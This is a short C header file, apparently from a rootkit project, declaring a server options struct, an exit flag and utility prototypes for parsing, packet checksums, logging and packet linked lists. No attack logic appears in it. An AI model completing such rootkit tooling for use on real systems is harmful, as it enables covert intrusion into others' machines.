#ifndef ROOTKIT_UTILS_H
#define ROOTKIT_UTILS_H

#include <stdbool.h>
#include "protocol.h"

struct server_options {
    char * host;
    char * interface_name;
    char * client_ip_address;
    int port;
    int client_fd;
};

extern _Atomic int exit_flag;

bool parse_int(const char *s, int *out);
unsigned short checksum(void *b, int len);
void log_message(const char *format, ...);
void free_linked_list(struct packet_data * head);
void print_linked_list(const struct packet_data * head);

#endif //ROOTKIT_UTILS_H